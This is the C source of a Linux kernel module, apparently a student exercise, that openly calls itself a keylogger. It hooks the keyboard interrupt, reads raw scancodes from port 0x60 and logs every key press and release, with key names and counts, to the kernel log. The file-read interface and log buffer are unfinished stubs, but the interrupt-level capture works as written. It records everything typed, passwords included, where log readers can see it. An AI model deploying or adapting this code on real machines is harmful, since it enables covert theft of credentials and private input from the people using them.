// SPDX-License-Identifier: GPL-2.0-or-later
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/hil.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
MODULE_DESCRIPTION("keyboard bad keylogger");

#define	MODULE_NAME		"keylogger"
#define KEYBOARD_IRQ		1

struct key_map {
	char			acii;
	unsigned int		scancode;
	const char		*name;
	bool			pressed;
	size_t			press_count;
};

enum e_key_event {
	PRESS,
	RELEASE
};

// this structure describe a log entry
// key : witch key this key refers to, it will point on key_table
// timestamp : when this event occured
// event : was it a press or a release ?

struct key_log_entry {
	struct key_map		*key;
	time_t			timestamp;
	enum e_key_event	event;
};

struct smart_buffer {
	void	*buf;
	size_t	size;
};

static struct smart_buffer key_log;

static struct key_map key_table[] = {
	(struct key_map){0x0, 0, "NUL", false, 0},
	(struct key_map){0x1, 1, "Escape", false, 0},
	(struct key_map){'1', 2, "1", false, 0},
	(struct key_map){'2', 3, "2", false, 0},
	(struct key_map){'3', 4, "3", false, 0},
	(struct key_map){'4', 5, "4", false, 0},
	(struct key_map){'5', 6, "5", false, 0},
	(struct key_map){'6', 7, "6", false, 0},
	(struct key_map){'7', 8, "7", false, 0},
	(struct key_map){'8', 9, "8", false, 0},
	(struct key_map){'9', 10, "9", false, 0},
	(struct key_map){'-', 11, "-", false, 0},
	(struct key_map){'=', 12, "=", false, 0},
	(struct key_map){'\t', 15, "TAB", false, 0},
	(struct key_map){0x7f, 14, "DEL", false, 0},
	(struct key_map){'q', 16, "q", false, 0},
	(struct key_map){'w', 17, "w", false, 0},
	(struct key_map){'e', 18, "e", false, 0},
	(struct key_map){'r', 19, "r", false, 0},
	(struct key_map){'t', 20, "t", false, 0},
	(struct key_map){'y', 21, "y", false, 0},
	(struct key_map){'u', 22, "u", false, 0},
	(struct key_map){'i', 23, "i", false, 0},
	(struct key_map){'o', 24, "o", false, 0},
	(struct key_map){'p', 25, "p", false, 0},
	(struct key_map){'[', 26, "[", false, 0},
	(struct key_map){']', 27, "]", false, 0},
	(struct key_map){'\n', 28, "Enter", false, 0},
	(struct key_map){0x0, 29, "Control-Left", false, 0},
	(struct key_map){'a', 30, "a", false, 0},
	(struct key_map){'s', 31, "s", false, 0},
	(struct key_map){'d', 32, "d", false, 0},
	(struct key_map){'f', 33, "f", false, 0},
	(struct key_map){'g', 34, "g", false, 0},
	(struct key_map){'h', 35, "h", false, 0},
	(struct key_map){'j', 36, "j", false, 0},
	(struct key_map){'k', 37, "k", false, 0},
	(struct key_map){'l', 38, "l", false, 0},
	(struct key_map){';', 39, ";", false, 0},
	(struct key_map){'\'', 40, "'", false, 0},
	(struct key_map){'-', 42, "Shift-Left", false, 0},
	(struct key_map){'\\', 43, "\\", false, 0},
	(struct key_map){'z', 44, "z", false, 0},
	(struct key_map){'x', 45, "x", false, 0},
	(struct key_map){'c', 46, "c", false, 0},
	(struct key_map){'v', 47, "v", false, 0},
	(struct key_map){'b', 48, "b", false, 0},
	(struct key_map){'n', 49, "n", false, 0},
	(struct key_map){'m', 50, "m", false, 0},
	(struct key_map){',', 51, ",", false, 0},
	(struct key_map){'.', 52, ".", false, 0},
	(struct key_map){'/', 53, "/", false, 0},
	(struct key_map){0x0, 54, "Shift-Right", false, 0},
	(struct key_map){' ', 56, "Alt-Right", false, 0},
	(struct key_map){' ', 57, "Space", false, 0},
	(struct key_map){0x0, 58, "Caps-Lock", false, 0},
	(struct key_map){0x0, 75, "Arrow-Left", false, 0},
	(struct key_map){0x0, 77, "Arrow-Right", false, 0},
	(struct key_map){0x0, 72, "Arrow-Up", false, 0},
	(struct key_map){0x0, 80, "Arrow-Down", false, 0},
	(struct key_map){0x0, 92, "Command-Right", false, 0},
	(struct key_map){0x0, 0, NULL, false, 0}
};

static struct key_map *get_key(const unsigned int scancode)
{
	size_t		i;

	i = 0;
	while (key_table[i].name) {
		if (key_table[i].scancode == scancode)
			return &key_table[i];
		i++;
	}
	return NULL;
}

static ssize_t	read_key(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	return 0;
}

static ssize_t	write_key(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
	return 0;
}

static const struct file_operations ops = {
	.read = read_key,
	.write = write_key
};

static irqreturn_t	key_handler(int irq, void *dev_id)
{
	const unsigned int	scancode = inb(0x60);
	struct key_map		*key;

	key = get_key(scancode & 0x7f);
	if (key) {
		key->pressed = (scancode & 0x80) == 0;
		if (key->pressed)
			key->press_count += 1;
		pr_info("(scan: %3u) -> %s : %10s [%4lu]\n", scancode,
			(key ? key->name : "/"),
			(key->pressed ? "pressed" : "released"),
			key->press_count);
	} else {
		pr_info("(scan: %3u) -> %s\n", scancode,
		       ((scancode & 0x80) == 0 ? "pressed" : "released"));
	}
	return IRQ_HANDLED;
}

static void		__exit hello_cleanup(void)
{
	pr_info(MODULE_NAME "Cleaning up module.\n");
	free_irq(KEYBOARD_IRQ, &key_handler);
	if (key_log.buf) {
		pr_info("cleaning log");
		memset(key_log.buf, 0, key_log.size);
		kfree(key_log.buf);
		key_log.buf = NULL;
		key_log.size = 0;
	}
}

static int		__init hello_init(void)
{
	int		ret;

	key_log = (struct smart_buffer){
		.buf = NULL,
		.size = 0
	};
	pr_info(MODULE_NAME "init !\n");
	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
		&key_handler);
	if (ret < 0) {
		pr_err("failed to request keyboard irq: %d\n", ret);
		return ret;
	}
	return 0;
}

module_init(hello_init);
module_exit(hello_cleanup);
